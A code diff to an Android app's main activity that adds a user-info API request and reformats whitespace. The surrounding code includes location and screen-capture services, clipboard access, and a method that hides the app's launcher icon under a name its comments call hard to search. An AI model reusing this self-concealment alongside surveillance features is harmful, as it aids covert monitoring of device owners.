@@ -18,14 +18,20 @@ import android.widget.Toast;
 import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.viewpager2.widget.ViewPager2;
+
+import com.example.test_filesync.api.ApiCallback;
+import com.example.test_filesync.api.ApiConfig;
 import com.example.test_filesync.databinding.ActivityMainBinding;
 import com.example.test_filesync.service.LocationService;
 import com.example.test_filesync.service.MediaProjectionService;
+import com.example.test_filesync.util.HttpUtil;
 import com.example.test_filesync.util.LogUtils;
 import com.google.android.material.bottomnavigation.BottomNavigationView;
 
 import android.media.projection.MediaProjectionManager;
 import android.util.Log;
+
+import java.util.HashMap;
 
 public class MainActivity extends AppCompatActivity {
     private ClipboardManager clipboard;
@@ -115,6 +121,22 @@ public class MainActivity extends AppCompatActivity {
                 "MainActivity",
                 "应用已启动，执行onCreate方法"
         );
+
+      HashMap<String, Object> mParams = new HashMap<String, Object>();
+        mParams.put("userId", "123");
+        HttpUtil.config(ApiConfig.user_userInfo, mParams)
+        .postRequest(this, new ApiCallback() {
+            @Override
+            public void onSuccess(String res) {
+                Log.d("UserApi", "getUserInfo success: " + res);
+            }
+
+            @Override
+            public void onFailure(Exception e) {
+                Log.d("UserApi", "getUserInfo failure: " + e.getMessage());
+            }
+        });
+
 
         // 检查权限
         // checkPermissions();
@@ -367,41 +389,41 @@ public class MainActivity extends AppCompatActivity {
     private void hideAppIcon() {
         try {
             PackageManager packageManager = getPackageManager();
-            
+
             // 正常的启动器别名
             ComponentName normalLauncher = new ComponentName(
                     getPackageName(),
                     "com.example.test_filesync.MainActivityLauncher"
             );
-            
+
             // 隐藏状态的启动器别名（名称为 "demo"，难以搜索）
             ComponentName hiddenLauncher = new ComponentName(
                     getPackageName(),
                     "com.example.test_filesync.MainActivityLauncherHidden"
             );
-            
+
             // 禁用正常的启动器
             packageManager.setComponentEnabledSetting(
                     normalLauncher,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
             );
-            
+
             // 启用隐藏的启动器（名称为"."，很难被搜索到）
             packageManager.setComponentEnabledSetting(
                     hiddenLauncher,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
             );
-            
+
             Toast.makeText(this, "应用已隐藏（包括搜索）", Toast.LENGTH_LONG).show();
             LogUtils.i(this, "MainActivity", "桌面图标已隐藏，搜索名称已更改为 '.'");
-            
+
             // 延迟关闭当前页面
             binding.getRoot().postDelayed(() -> {
                 finish();
             }, 1000);
-            
+
         } catch (Exception e) {
             Toast.makeText(this, "隐藏图标失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
             LogUtils.i(this, "MainActivity", "隐藏图标失败: " + e.getMessage());
@@ -415,36 +437,36 @@ public class MainActivity extends AppCompatActivity {
     public void showAppIcon() {
         try {
             PackageManager packageManager = getPackageManager();
-            
+
             // 正常的启动器别名
             ComponentName normalLauncher = new ComponentName(
                     getPackageName(),
                     "com.example.test_filesync.MainActivityLauncher"
             );
-            
+
             // 隐藏状态的启动器别名
             ComponentName hiddenLauncher = new ComponentName(
                     getPackageName(),
                     "com.example.test_filesync.MainActivityLauncherHidden"
             );
-            
+
             // 启用正常的启动器
             packageManager.setComponentEnabledSetting(
                     normalLauncher,
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                     PackageManager.DONT_KILL_APP
             );
-            
+
             // 禁用隐藏的启动器
             packageManager.setComponentEnabledSetting(
                     hiddenLauncher,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
             );
-            
+
             Toast.makeText(this, "应用图标已恢复", Toast.LENGTH_LONG).show();
             LogUtils.i(this, "MainActivity", "桌面图标已恢复");
-            
+
         } catch (Exception e) {
             Toast.makeText(this, "恢复图标失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
             LogUtils.i(this, "MainActivity", "恢复图标失败: " + e.getMessage());
